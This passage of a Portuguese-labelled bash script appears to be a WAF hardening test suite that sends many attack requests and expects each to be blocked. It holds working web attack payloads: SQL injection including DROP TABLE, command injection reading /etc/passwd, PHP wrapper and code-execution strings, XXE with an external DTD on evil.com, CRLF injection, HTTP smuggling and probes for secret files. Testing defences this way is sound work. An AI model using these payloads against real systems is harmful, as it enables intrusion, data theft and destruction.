    test_curl "WP: wp-config.php" "block" -A "$UA" -Lk "${URL}/wp-config.php"
    test_curl "WP: wp-config.php.bak" "block" -A "$UA" -Lk "${URL}/wp-config.php.bak"
    test_curl "WP: wp-config.php.old" "block" -A "$UA" -Lk "${URL}/wp-config.php.old"
    test_curl "WP: wp-config.php.save" "block" -A "$UA" -Lk "${URL}/wp-config.php.save"
    test_curl "WP: wp-config.php.swp" "block" -A "$UA" -Lk "${URL}/wp-config.php.swp"
    test_curl "WP: wp-config.php~" "block" -A "$UA" -Lk "${URL}/wp-config.php~"
    test_curl "WP: wp-config.txt" "block" -A "$UA" -Lk "${URL}/wp-config.txt"
    test_curl "WP: wp-config-sample.php" "block" -A "$UA" -Lk "${URL}/wp-config-sample.php"
    
    print_subsection "Instalação e Debug WordPress"
    test_curl "WP: wp-admin/install.php" "block" -A "$UA" -Lk "${URL}/wp-admin/install.php"
    test_curl "WP: wp-admin/setup-config.php" "block" -A "$UA" -Lk "${URL}/wp-admin/setup-config.php"
    test_curl "WP: wp-admin/upgrade.php" "block" -A "$UA" -Lk "${URL}/wp-admin/upgrade.php"
    test_curl "WP: wp-includes/version.php" "block" -A "$UA" -Lk "${URL}/wp-includes/version.php"
    test_curl "WP: debug.log" "block" -A "$UA" -Lk "${URL}/wp-content/debug.log"
    test_curl "WP: error_log" "block" -A "$UA" -Lk "${URL}/error_log"
    test_curl "WP: php_errorlog" "block" -A "$UA" -Lk "${URL}/php_errorlog"
    
    print_subsection "XMLRPC e REST API Attacks"
    test_curl "WP: xmlrpc.php (POST)" "block" -A "$UA" -Lk -X POST "${URL}/xmlrpc.php"
    test_curl "WP: xmlrpc.php (GET)" "block" -A "$UA" -Lk "${URL}/xmlrpc.php"
    test_curl "WP: wp-json/wp/v2/users" "block" -A "$UA" -Lk "${URL}/wp-json/wp/v2/users"
    test_curl "WP: ?author=1 (enum)" "block" -A "$UA" -Lk "${URL}/?author=1"
    test_curl "WP: ?rest_route=/wp/v2/users" "block" -A "$UA" -Lk "${URL}/?rest_route=/wp/v2/users"
    
    print_subsection "Plugins Vulneráveis Conhecidos"
    test_curl "WP: revslider upload" "block" -A "$UA" -Lk "${URL}/wp-admin/admin-ajax.php?action=revslider_show_image"
    test_curl "WP: timthumb.php" "block" -A "$UA" -Lk "${URL}/wp-content/themes/starter/timthumb.php"
    test_curl "WP: uploadify.php" "block" -A "$UA" -Lk "${URL}/wp-content/plugins/uploadify/uploadify.php"
    test_curl "WP: wp-file-manager" "block" -A "$UA" -Lk "${URL}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
    test_curl "WP: duplicator installer" "block" -A "$UA" -Lk "${URL}/dup-installer/main.installer.php"
    test_curl "WP: backup-db" "block" -A "$UA" -Lk "${URL}/wp-content/backup-db/"
    test_curl "WP: backwpup" "block" -A "$UA" -Lk "${URL}/wp-content/plugins/backwpup/tmp/"
    
    print_subsection "Uploads e Shells"
    test_curl "WP: uploads listagem" "block" -A "$UA" -Lk "${URL}/wp-content/uploads/"
    test_curl "WP: uploads PHP" "block" -A "$UA" -Lk "${URL}/wp-content/uploads/shell.php"
    test_curl "WP: uploads backdoor" "block" -A "$UA" -Lk "${URL}/wp-content/uploads/2024/01/shell.php"
    test_curl "WP: uploads .htaccess" "block" -A "$UA" -Lk "${URL}/wp-content/uploads/.htaccess"
    test_curl "WP: themes PHP exec" "block" -A "$UA" -Lk "${URL}/wp-content/themes/theme/cmd.php"
    
    print_subsection "Arquivos Sensíveis Gerais"
    test_curl "URI: .htaccess" "block" -A "$UA" -Lk "${URL}/.htaccess"
    test_curl "URI: .htpasswd" "block" -A "$UA" -Lk "${URL}/.htpasswd"
    test_curl "URI: .env" "block" -A "$UA" -Lk "${URL}/.env"
    test_curl "URI: .env.local" "block" -A "$UA" -Lk "${URL}/.env.local"
    test_curl "URI: .git/config" "block" -A "$UA" -Lk "${URL}/.git/config"
    test_curl "URI: .git/HEAD" "block" -A "$UA" -Lk "${URL}/.git/HEAD"
    test_curl "URI: .svn/entries" "block" -A "$UA" -Lk "${URL}/.svn/entries"
    test_curl "URI: .DS_Store" "block" -A "$UA" -Lk "${URL}/.DS_Store"
    
    print_subsection "Backups e Dumps"
    test_curl "URI: dump.sql" "block" -A "$UA" -Lk "${URL}/dump.sql"
    test_curl "URI: database.sql" "block" -A "$UA" -Lk "${URL}/database.sql"
    test_curl "URI: backup.sql" "block" -A "$UA" -Lk "${URL}/backup.sql"
    test_curl "URI: db.sql" "block" -A "$UA" -Lk "${URL}/db.sql"
    test_curl "URI: backup.zip" "block" -A "$UA" -Lk "${URL}/backup.zip"
    test_curl "URI: backup.tar.gz" "block" -A "$UA" -Lk "${URL}/backup.tar.gz"
    test_curl "URI: site.zip" "block" -A "$UA" -Lk "${URL}/site.zip"
    
    print_subsection "Ferramentas de Debug/Admin"
    test_curl "URI: phpinfo.php" "block" -A "$UA" -Lk "${URL}/phpinfo.php"
    test_curl "URI: info.php" "block" -A "$UA" -Lk "${URL}/info.php"
    test_curl "URI: adminer.php" "block" -A "$UA" -Lk "${URL}/adminer.php"
    test_curl "URI: phpmyadmin" "block" -A "$UA" -Lk "${URL}/phpmyadmin/"
    test_curl "URI: pma" "block" -A "$UA" -Lk "${URL}/pma/"
}

#==============================================================================
# HEADER INJECTION (10 testes)
#==============================================================================
test_header_injection() {
    print_section "💉 TESTES DE HEADER INJECTION (20 testes)"
    
    print_subsection "CRLF Injection"
    test_curl "CRLF: Básico" "block" -A "$UA" -Lk -H $'X-Custom: test\r\nX-Injected: hacked' "$URL"
    test_curl "CRLF: Set-Cookie" "block" -A "$UA" -Lk -H $'X-Test: test\r\nSet-Cookie: admin=true' "$URL"
    test_curl "CRLF: Location redirect" "block" -A "$UA" -Lk -H $'X-Test: test\r\nLocation: http://evil.com' "$URL"
    test_curl "CRLF: Content-Type" "block" -A "$UA" -Lk -H $'X-Test: test\r\nContent-Type: text/html' "$URL"
    test_curl "CRLF: Double CRLF (body)" "block" -A "$UA" -Lk -H $'X-Test: test\r\n\r\n<html>injected</html>' "$URL"
    
    print_subsection "Header Override Attacks"
    test_curl "X-Forwarded-Host: evil.com" "block" -A "$UA" -Lk -H "X-Forwarded-Host: evil.com" "$URL"
    test_curl "X-Forwarded-Proto: http" "block" -A "$UA" -Lk -H "X-Forwarded-Proto: http" "$URL"
    test_curl "X-Original-URL: /admin" "block" -A "$UA" -Lk -H "X-Original-URL: /admin" "$URL"
    test_curl "X-Rewrite-URL: /admin" "block" -A "$UA" -Lk -H "X-Rewrite-URL: /admin" "$URL"
    test_curl "X-HTTP-Method-Override: DELETE" "block" -A "$UA" -Lk -H "X-HTTP-Method-Override: DELETE" "$URL"
    test_curl "X-HTTP-Method-Override: PUT" "block" -A "$UA" -Lk -H "X-HTTP-Method-Override: PUT" "$URL"
    test_curl "X-HTTP-Method-Override: TRACE" "block" -A "$UA" -Lk -H "X-HTTP-Method-Override: TRACE" "$URL"
    
    print_subsection "Payloads em Headers"
    test_curl "Header: SQL Injection" "block" -A "$UA" -Lk -H "X-Custom: ' OR '1'='1" "$URL"
    test_curl "Header: XSS" "block" -A "$UA" -Lk -H "X-Custom: <script>alert(1)</script>" "$URL"
    test_curl "Header: Null byte" "block" -A "$UA" -Lk -H "X-Custom: admin%00" "$URL"
    test_curl "Header: Path traversal" "block" -A "$UA" -Lk -H "X-Custom: ../../etc/passwd" "$URL"
    test_curl "Header: Command injection" "block" -A "$UA" -Lk -H "X-Custom: ;cat /etc/passwd" "$URL"
    test_curl "Header: Template injection" "block" -A "$UA" -Lk -H "X-Custom: {{7*7}}" "$URL"
    test_curl "Header: Muito longo (8KB)" "block" -A "$UA" -Lk -H "X-Long: $(head -c 8000 /dev/zero | tr '\0' 'A')" "$URL"
}

#==============================================================================
# CONTENT-TYPE ATTACKS (20 testes)
#==============================================================================
test_content_type() {
    print_section "📄 TESTES DE CONTENT-TYPE ATTACKS (20 testes)"
    
    print_subsection "XXE e XML Attacks"
    test_curl "CT: XXE básico" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "$URL"
    test_curl "CT: XXE com DTD externa" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd"><foo></foo>' "$URL"
    test_curl "CT: XXE parameter entity" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>' "$URL"
    test_curl "CT: SOAP injection" "block" -A "$UA" -Lk -H "Content-Type: application/soap+xml" -d '<?xml version="1.0"?><soap:Envelope><soap:Body><x>test</x></soap:Body></soap:Envelope>' "$URL"
    
    print_subsection "XSS via Content-Type"
    test_curl "CT: SVG XSS" "block" -A "$UA" -Lk -H "Content-Type: image/svg+xml" -d '<svg onload="alert(1)">' "$URL"
    test_curl "CT: HTML XSS" "block" -A "$UA" -Lk -H "Content-Type: text/html" -d "<script>alert(1)</script>" "$URL"
    test_curl "CT: XHTML XSS" "block" -A "$UA" -Lk -H "Content-Type: application/xhtml+xml" -d '<html><script>alert(1)</script></html>' "$URL"
    
    print_subsection "Charset e Encoding Attacks"
    test_curl "CT: UTF-7 charset" "block" -A "$UA" -Lk -H "Content-Type: text/html; charset=UTF-7" "$URL"
    test_curl "CT: UTF-32 charset" "block" -A "$UA" -Lk -H "Content-Type: text/html; charset=UTF-32" "$URL"
    test_curl "CT: ISO-2022-JP" "block" -A "$UA" -Lk -H "Content-Type: text/html; charset=ISO-2022-JP" "$URL"
    
    print_subsection "MIME Type Confusion"
    test_curl "CT: multipart sem boundary" "block" -A "$UA" -Lk -H "Content-Type: multipart/form-data" "$URL"
    test_curl "CT: application/x-httpd-php" "block" -A "$UA" -Lk -H "Content-Type: application/x-httpd-php" -d "<?php system('id'); ?>" "$URL"
    test_curl "CT: tipo inexistente" "block" -A "$UA" -Lk -H "Content-Type: evil/payload" "$URL"
    test_curl "CT: application/octet-stream" "block" -A "$UA" -Lk -H "Content-Type: application/octet-stream" -d "malicious binary" "$URL"
    test_curl "CT: text/x-php" "block" -A "$UA" -Lk -H "Content-Type: text/x-php" "$URL"
    
    print_subsection "Payload Injection"
    test_curl "CT: SQLi em form" "block" -A "$UA" -Lk -H "Content-Type: application/x-www-form-urlencoded" -d "user=admin' OR 1=1--" "$URL"
    test_curl "CT: JSON SQLi" "block" -A "$UA" -Lk -H "Content-Type: application/json" -d '{"user":"admin\u0027 OR 1=1--"}' "$URL"
    test_curl "CT: CRLF em Content-Type" "block" -A "$UA" -Lk -H $'Content-Type: text/html\r\nX-Injected: true' "$URL"
    test_curl "CT: muito longo" "block" -A "$UA" -Lk -H "Content-Type: text/$(head -c 1000 /dev/zero | tr '\0' 'A')" "$URL"
}

#==============================================================================
# ACCEPT-ENCODING ATTACKS (20 testes)
#==============================================================================
test_accept_encoding() {
    print_section "🗜️ TESTES DE ACCEPT-ENCODING ATTACKS (20 testes)"
    
    print_subsection "Encoding Manipulation"
    test_curl "AE: muitos encodings" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip, deflate, br, compress, identity, *, sdch, xz, lzma, zstd" "$URL"
    test_curl "AE: encoding repetido x100" "block" -A "$UA" -Lk -H "Accept-Encoding: $(printf 'gzip,%.0s' {1..100})" "$URL"
    test_curl "AE: encoding repetido x500" "block" -A "$UA" -Lk -H "Accept-Encoding: $(printf 'deflate,%.0s' {1..500})" "$URL"
    test_curl "AE: chunked (smuggling)" "block" -A "$UA" -Lk -H "Accept-Encoding: chunked" "$URL"
    test_curl "AE: transfer-encoding em AE" "block" -A "$UA" -Lk -H "Accept-Encoding: chunked, gzip" "$URL"
    
    print_subsection "Payload Injection em AE"
    test_curl "AE: XSS" "block" -A "$UA" -Lk -H "Accept-Encoding: <script>alert(1)</script>" "$URL"
    test_curl "AE: SQL Injection" "block" -A "$UA" -Lk -H "Accept-Encoding: ' OR 1=1--" "$URL"
    test_curl "AE: path traversal" "block" -A "$UA" -Lk -H "Accept-Encoding: ../../etc/passwd" "$URL"
    test_curl "AE: command injection" "block" -A "$UA" -Lk -H "Accept-Encoding: ;cat /etc/passwd" "$URL"
    test_curl "AE: null byte" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip%00deflate" "$URL"
    
    print_subsection "CRLF e Malformed"
    test_curl "AE: CRLF injection" "block" -A "$UA" -Lk -H $'Accept-Encoding: gzip\r\nX-Injected: true' "$URL"
    test_curl "AE: encoding inexistente" "block" -A "$UA" -Lk -H "Accept-Encoding: evil-encoding-doom" "$URL"
    test_curl "AE: q-value malicioso" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip; q=99999999" "$URL"
    test_curl "AE: q-value negativo" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip; q=-1" "$URL"
    test_curl "AE: caracteres especiais" "block" -A "$UA" -Lk -H "Accept-Encoding: gzip; q=<script>" "$URL"
    
    print_subsection "Overflow"
    test_curl "AE: 2KB" "block" -A "$UA" -Lk -H "Accept-Encoding: $(head -c 2000 /dev/zero | tr '\0' 'A')" "$URL"
    test_curl "AE: 4KB" "block" -A "$UA" -Lk -H "Accept-Encoding: $(head -c 4000 /dev/zero | tr '\0' 'B')" "$URL"
    test_curl "AE: 8KB" "block" -A "$UA" -Lk -H "Accept-Encoding: $(head -c 8000 /dev/zero | tr '\0' 'C')" "$URL"
    test_curl "AE: com wildcards" "block" -A "$UA" -Lk -H "Accept-Encoding: *, gzip;q=0, deflate;q=0" "$URL"
    test_curl "AE: identity negado" "block" -A "$UA" -Lk -H "Accept-Encoding: identity;q=0, *;q=0" "$URL"
}

#==============================================================================
# X-FORWARDED-FOR SPOOFING (20 testes)
#==============================================================================
test_xff_spoofing() {
    print_section "🌐 TESTES DE X-FORWARDED-FOR SPOOFING (20 testes)"
    
    print_subsection "IP Privado/Local"
    test_curl "XFF: 127.0.0.1" "block" -A "$UA" -Lk -H "X-Forwarded-For: 127.0.0.1" "$URL"
    test_curl "XFF: localhost" "block" -A "$UA" -Lk -H "X-Forwarded-For: localhost" "$URL"
    test_curl "XFF: 192.168.1.1" "block" -A "$UA" -Lk -H "X-Forwarded-For: 192.168.1.1" "$URL"
    test_curl "XFF: 10.0.0.1" "block" -A "$UA" -Lk -H "X-Forwarded-For: 10.0.0.1" "$URL"
    test_curl "XFF: 172.16.0.1" "block" -A "$UA" -Lk -H "X-Forwarded-For: 172.16.0.1" "$URL"
    test_curl "XFF: ::1 (IPv6)" "block" -A "$UA" -Lk -H "X-Forwarded-For: ::1" "$URL"
    test_curl "XFF: 0.0.0.0" "block" -A "$UA" -Lk -H "X-Forwarded-For: 0.0.0.0" "$URL"
    
    print_subsection "Cloud Metadata IPs"
    test_curl "XFF: 169.254.169.254 (AWS)" "block" -A "$UA" -Lk -H "X-Forwarded-For: 169.254.169.254" "$URL"
    test_curl "XFF: 169.254.170.2 (AWS ECS)" "block" -A "$UA" -Lk -H "X-Forwarded-For: 169.254.170.2" "$URL"
    test_curl "XFF: 100.100.100.200 (Alibaba)" "block" -A "$UA" -Lk -H "X-Forwarded-For: 100.100.100.200" "$URL"
    
    print_subsection "Payload Injection"
    test_curl "XFF: SQL Injection" "block" -A "$UA" -Lk -H "X-Forwarded-For: ' OR 1=1--" "$URL"
    test_curl "XFF: XSS" "block" -A "$UA" -Lk -H "X-Forwarded-For: <script>alert(1)</script>" "$URL"
    test_curl "XFF: Command injection" "block" -A "$UA" -Lk -H "X-Forwarded-For: ;cat /etc/passwd" "$URL"
    test_curl "XFF: CRLF injection" "block" -A "$UA" -Lk -H $'X-Forwarded-For: 1.2.3.4\r\nX-Injected: true' "$URL"
    
    print_subsection "Multiple IPs e Headers Alternativos"
    test_curl "XFF: múltiplos IPs" "block" -A "$UA" -Lk -H "X-Forwarded-For: 8.8.8.8, 127.0.0.1, 192.168.1.1" "$URL"
    test_curl "X-Real-IP: 127.0.0.1" "block" -A "$UA" -Lk -H "X-Real-IP: 127.0.0.1" "$URL"
    test_curl "X-Client-IP: 192.168.0.1" "block" -A "$UA" -Lk -H "X-Client-IP: 192.168.0.1" "$URL"
    test_curl "X-Originating-IP: 10.0.0.1" "block" -A "$UA" -Lk -H "X-Originating-IP: 10.0.0.1" "$URL"
    test_curl "X-Remote-IP: localhost" "block" -A "$UA" -Lk -H "X-Remote-IP: localhost" "$URL"
    test_curl "X-Remote-Addr: 127.0.0.1" "block" -A "$UA" -Lk -H "X-Remote-Addr: 127.0.0.1" "$URL"
}

#==============================================================================
# RANGE HEADER ATTACKS (20 testes)
#==============================================================================
test_range_header() {
    print_section "📊 TESTES DE RANGE HEADER ATTACKS (20 testes)"
    
    print_subsection "Range DoS"
    test_curl "Range: 10 ranges" "block" -A "$UA" -Lk -H "Range: bytes=0-0,1-1,2-2,3-3,4-4,5-5,6-6,7-7,8-8,9-9" "$URL"
    test_curl "Range: 50 ranges" "block" -A "$UA" -Lk -H "Range: bytes=$(for i in $(seq 0 2 100); do echo -n "$i-$((i+1)),"; done | sed 's/,$//')" "$URL"
    test_curl "Range: 100 ranges" "block" -A "$UA" -Lk -H "Range: bytes=$(for i in $(seq 0 2 200); do echo -n "$i-$((i+1)),"; done | sed 's/,$//')" "$URL"
    test_curl "Range: overlapping" "block" -A "$UA" -Lk -H "Range: bytes=0-100,50-150,100-200,150-250" "$URL"
    
    print_subsection "Range Malformado"
    test_curl "Range: bytes=-1" "block" -A "$UA" -Lk -H "Range: bytes=-1" "$URL"
    test_curl "Range: muito grande" "block" -A "$UA" -Lk -H "Range: bytes=0-99999999999999999" "$URL"
    test_curl "Range: negativo" "block" -A "$UA" -Lk -H "Range: bytes=-99999999999" "$URL"
    test_curl "Range: invertido" "block" -A "$UA" -Lk -H "Range: bytes=100-0" "$URL"
    test_curl "Range: sem número" "block" -A "$UA" -Lk -H "Range: bytes=abc-xyz" "$URL"
    test_curl "Range: formato inválido" "block" -A "$UA" -Lk -H "Range: invalid-format-attack" "$URL"
    
    print_subsection "Payload em Range"
    test_curl "Range: XSS" "block" -A "$UA" -Lk -H "Range: bytes=<script>alert(1)</script>" "$URL"
    test_curl "Range: SQL Injection" "block" -A "$UA" -Lk -H "Range: bytes=' OR 1=1--" "$URL"
    test_curl "Range: Command injection" "block" -A "$UA" -Lk -H "Range: bytes=;cat /etc/passwd" "$URL"
    test_curl "Range: Path traversal" "block" -A "$UA" -Lk -H "Range: bytes=../../etc/passwd" "$URL"
    test_curl "Range: Null byte" "block" -A "$UA" -Lk -H "Range: bytes=0-100%00" "$URL"
    
    print_subsection "Range Overflow"
    test_curl "Range: INT_MAX" "block" -A "$UA" -Lk -H "Range: bytes=0-2147483647" "$URL"
    test_curl "Range: INT_MAX+1" "block" -A "$UA" -Lk -H "Range: bytes=0-2147483648" "$URL"
    test_curl "Range: LONG_MAX" "block" -A "$UA" -Lk -H "Range: bytes=0-9223372036854775807" "$URL"
    test_curl "Range: header muito longo" "block" -A "$UA" -Lk -H "Range: bytes=$(head -c 5000 /dev/zero | tr '\0' '1')" "$URL"
    test_curl "Range: unidade inválida" "block" -A "$UA" -Lk -H "Range: evil=0-100" "$URL"
}

#==============================================================================
# HTTP SMUGGLING ATTACKS (20 testes)
#==============================================================================
test_http_smuggling() {
    print_section "🚢 TESTES DE HTTP SMUGGLING (20 testes)"
    
    print_subsection "CL.TE e TE.CL"
    test_curl "Smuggling: CL + TE" "block" -A "$UA" -Lk -H "Content-Length: 0" -H "Transfer-Encoding: chunked" "$URL"
    test_curl "Smuggling: TE + CL" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -H "Content-Length: 0" "$URL"
    test_curl "Smuggling: CL duplicado diferente" "block" -A "$UA" -Lk -H "Content-Length: 0" -H "Content-Length: 100" "$URL"
    test_curl "Smuggling: TE duplicado" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked" -H "Transfer-Encoding: identity" "$URL"
    
    print_subsection "Transfer-Encoding Obfuscation"
    test_curl "Smuggling: TE com espaço" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked " "$URL"
    test_curl "Smuggling: TE com tab" "block" -A "$UA" -Lk -H $'Transfer-Encoding:\tchunked' "$URL"
    test_curl "Smuggling: TE + identity" "block" -A "$UA" -Lk -H "Transfer-Encoding: chunked, identity" "$URL"
    test_curl "Smuggling: TE com newline" "block" -A "$UA" -Lk -H $'Transfer-Encoding: chunked\n' "$URL"
    test_curl "Smuggling: TE capitalizado" "block" -A "$UA" -Lk -H "Transfer-Encoding: ChUnKeD" "$URL"
    test_curl "Smuggling: X-Transfer-Encoding" "block" -A "$UA" -Lk -H "X-Transfer-Encoding: chunked" "$URL"
    test_curl "Smuggling: Transfer_Encoding" "block" -A "$UA" -Lk -H "Transfer_Encoding: chunked" "$URL"
    
    print_subsection "Content-Length Manipulation"
    test_curl "Smuggling: CL negativo" "block" -A "$UA" -Lk -H "Content-Length: -1" "$URL"
    test_curl "Smuggling: CL muito grande" "block" -A "$UA" -Lk -H "Content-Length: 999999999999" "$URL"
    test_curl "Smuggling: CL zero com body" "block" -A "$UA" -Lk -H "Content-Length: 0" -d "hidden data" "$URL"
    test_curl "Smuggling: CL decimal" "block" -A "$UA" -Lk -H "Content-Length: 10.5" "$URL"
    test_curl "Smuggling: CL hex" "block" -A "$UA" -Lk -H "Content-Length: 0x10" "$URL"
    
    print_subsection "CRLF e Headers Malformados"
    test_curl "Smuggling: TE com CRLF" "block" -A "$UA" -Lk -H $'Transfer-Encoding: chunked\r\n: x' "$URL"
    test_curl "Smuggling: linha vazia antes" "block" -A "$UA" -Lk -H $'\r\nTransfer-Encoding: chunked' "$URL"
    test_curl "Smuggling: espaço antes do :" "block" -A "$UA" -Lk -H "Transfer-Encoding : chunked" "$URL"
    test_curl "Smuggling: múltiplos espaços" "block" -A "$UA" -Lk -H "Transfer-Encoding:    chunked" "$URL"
}

#==============================================================================
# NGINX SPECIFIC ATTACKS (20 testes)
#==============================================================================
test_nginx_attacks() {
    print_section "🔧 TESTES DE ATAQUES AO NGINX (20 testes)"
    
    print_subsection "Path Traversal e Alias"
    test_curl "Nginx: path traversal básico" "block" -A "$UA" -Lk "${URL}/../../../etc/passwd"
    test_curl "Nginx: path traversal encoded" "block" -A "$UA" -Lk "${URL}/..%2f..%2f..%2fetc/passwd"
    test_curl "Nginx: path traversal double" "block" -A "$UA" -Lk "${URL}/....//....//etc/passwd"
    test_curl "Nginx: alias traversal" "block" -A "$UA" -Lk "${URL}/static../etc/passwd"
    test_curl "Nginx: null byte" "block" -A "$UA" -Lk "${URL}/index.php%00.jpg"
    
    print_subsection "Buffer Overflow"
    test_curl "Nginx: URI muito longa (4KB)" "block" -A "$UA" -Lk "${URL}/$(head -c 4000 /dev/zero | tr '\0' 'A')"
    test_curl "Nginx: URI muito longa (8KB)" "block" -A "$UA" -Lk "${URL}/$(head -c 8000 /dev/zero | tr '\0' 'B')"
    test_curl "Nginx: muitos headers" "block" -A "$UA" -Lk $(for i in {1..100}; do echo -n "-H 'X-Header-$i: value' "; done) "$URL"
    
    print_subsection "Configuração Exposta"
    test_curl "Nginx: nginx.conf" "block" -A "$UA" -Lk "${URL}/nginx.conf"
    test_curl "Nginx: /server-status" "block" -A "$UA" -Lk "${URL}/server-status"
    test_curl "Nginx: /nginx_status" "block" -A "$UA" -Lk "${URL}/nginx_status"
    test_curl "Nginx: /status" "block" -A "$UA" -Lk "${URL}/status"
    test_curl "Nginx: /.nginx" "block" -A "$UA" -Lk "${URL}/.nginx"
    
    print_subsection "Slowloris e DoS"
    test_curl "Nginx: header parcial" "block" -A "$UA" -Lk -H "X-Slow: " "$URL"
    test_curl "Nginx: muitos cookies" "block" -A "$UA" -Lk --cookie "$(for i in {1..200}; do echo -n "c$i=v;"; done)" "$URL"
    
    print_subsection "Requests Malformados"
    test_curl "Nginx: HTTP/0.9" "block" -A "$UA" -Lk --http0.9 "$URL" 2>/dev/null || echo "  [?] HTTP/0.9 não suportado"
    test_curl "Nginx: duplo // path" "block" -A "$UA" -Lk "${URL}//admin//secret"
    test_curl "Nginx: backslash path" "block" -A "$UA" -Lk "${URL}/admin\\..\\secret"
    test_curl "Nginx: CONNECT internal" "block" -A "$UA" -Lk -X CONNECT "${URL}:443"
    test_curl "Nginx: Host com porta" "block" -A "$UA" -Lk -H "Host: localhost:22" "$URL"
}

#==============================================================================
# PHP SPECIFIC ATTACKS (20 testes)
#==============================================================================
test_php_attacks() {
    print_section "🐘 TESTES DE ATAQUES AO PHP (20 testes)"
    
    print_subsection "PHP Wrappers e Streams"
    test_curl "PHP: php://filter base64" "block" -A "$UA" -Lk "${URL}?file=php://filter/convert.base64-encode/resource=index.php"
    test_curl "PHP: php://input" "block" -A "$UA" -Lk "${URL}?file=php://input" -d "<?php system('id'); ?>"
    test_curl "PHP: php://stdin" "block" -A "$UA" -Lk "${URL}?file=php://stdin"
    test_curl "PHP: expect://" "block" -A "$UA" -Lk "${URL}?file=expect://id"
    test_curl "PHP: data://" "block" -A "$UA" -Lk "${URL}?file=data://text/plain,<?php system('id'); ?>"
    test_curl "PHP: phar://" "block" -A "$UA" -Lk "${URL}?file=phar://exploit.phar"
    test_curl "PHP: zip://" "block" -A "$UA" -Lk "${URL}?file=zip://exploit.zip%23shell.php"
    
    print_subsection "Deserialization"
    test_curl "PHP: unserialize O:" "block" -A "$UA" -Lk "${URL}?data=O:8:\"stdClass\":0:{}"
    test_curl "PHP: unserialize a:" "block" -A "$UA" -Lk "${URL}?data=a:1:{s:4:\"test\";s:4:\"data\";}"
    test_curl "PHP: serialize gadget" "block" -A "$UA" -Lk -H "Content-Type: application/x-www-form-urlencoded" -d 'data=O:7:"Exploit":1:{s:4:"file";s:11:"/etc/passwd";}' "$URL"
    
    print_subsection "Code Injection"
    test_curl "PHP: eval()" "block" -A "$UA" -Lk "${URL}?code=phpinfo()"
    test_curl "PHP: assert()" "block" -A "$UA" -Lk "${URL}?code=assert('system(\"id\")')"
    test_curl "PHP: preg_replace /e" "block" -A "$UA" -Lk "${URL}?pattern=/e&replace=system('id')"
    test_curl "PHP: create_function" "block" -A "$UA" -Lk "${URL}?func=}system('id');//"
    test_curl "PHP: backticks" "block" -A "$UA" -Lk "${URL}?cmd=\`id\`"
    
    print_subsection "Info Disclosure"
    test_curl "PHP: phpinfo()" "block" -A "$UA" -Lk "${URL}/phpinfo.php"
    test_curl "PHP: php-info" "block" -A "$UA" -Lk "${URL}/php-info.php"
    test_curl "PHP: test.php" "block" -A "$UA" -Lk "${URL}/test.php"
    test_curl "PHP: info.php" "block" -A "$UA" -Lk "${URL}/info.php"
    test_curl "PHP: php.ini exposed" "block" -A "$UA" -Lk "${URL}/php.ini"
}

#==============================================================================
# DATABASE ATTACKS - MySQL/MariaDB (20 testes)
#==============================================================================
test_database_attacks() {
    print_section "🗄️ TESTES DE ATAQUES A DATABASE (20 testes)"
    
    print_subsection "SQL Injection - Clássico"
    test_curl "DB: OR 1=1" "block" -A "$UA" -Lk "${URL}?id=1' OR '1'='1"
    test_curl "DB: OR 1=1 comment" "block" -A "$UA" -Lk "${URL}?id=1' OR 1=1--"
    test_curl "DB: OR 1=1 hash comment" "block" -A "$UA" -Lk "${URL}?id=1' OR 1=1#"
    test_curl "DB: UNION SELECT" "block" -A "$UA" -Lk "${URL}?id=1' UNION SELECT 1,2,3--"
    test_curl "DB: UNION ALL SELECT" "block" -A "$UA" -Lk "${URL}?id=1' UNION ALL SELECT 1,user(),database()--"
    
    print_subsection "SQL Injection - Time Based"
    test_curl "DB: SLEEP(5)" "block" -A "$UA" -Lk "${URL}?id=1' AND SLEEP(5)--"
    test_curl "DB: BENCHMARK" "block" -A "$UA" -Lk "${URL}?id=1' AND BENCHMARK(10000000,SHA1('test'))--"
    test_curl "DB: WAITFOR DELAY" "block" -A "$UA" -Lk "${URL}?id=1'; WAITFOR DELAY '0:0:5'--"
    
    print_subsection "SQL Injection - Out of Band"
    test_curl "DB: INTO OUTFILE" "block" -A "$UA" -Lk "${URL}?id=1' INTO OUTFILE '/tmp/test.txt'--"
    test_curl "DB: INTO DUMPFILE" "block" -A "$UA" -Lk "${URL}?id=1' INTO DUMPFILE '/tmp/test.txt'--"
    test_curl "DB: LOAD_FILE" "block" -A "$UA" -Lk "${URL}?id=1' UNION SELECT LOAD_FILE('/etc/passwd')--"
    
    print_subsection "SQL Injection - Stacked Queries"
    test_curl "DB: DROP TABLE" "block" -A "$UA" -Lk "${URL}?id=1'; DROP TABLE users--"
    test_curl "DB: DELETE FROM" "block" -A "$UA" -Lk "${URL}?id=1'; DELETE FROM users--"
    test_curl "DB: UPDATE SET" "block" -A "$UA" -Lk "${URL}?id=1'; UPDATE users SET admin=1--"
    test_curl "DB: INSERT INTO" "block" -A "$UA" -Lk "${URL}?id=1'; INSERT INTO users VALUES('hacker','pass')--"
    
    print_subsection "MySQL/MariaDB Específico"
    test_curl "DB: @@version" "block" -A "$UA" -Lk "${URL}?id=1' UNION SELECT @@version--"
    test_curl "DB: INFORMATION_SCHEMA" "block" -A "$UA" -Lk "${URL}?id=1' UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES--"
    test_curl "DB: HEX encoded" "block" -A "$UA" -Lk "${URL}?id=0x31204f5220313d31"
    test_curl "DB: CHAR() bypass" "block" -A "$UA" -Lk "${URL}?id=1' AND 1=CHAR(49)--"
    test_curl "DB: /*!MySQL comment*/" "block" -A "$UA" -Lk "${URL}?id=1'/*!50000UNION*/SELECT 1--"
}

#==============================================================================
# SSRF ATTACKS (15 testes)
#==============================================================================
test_ssrf_attacks() {
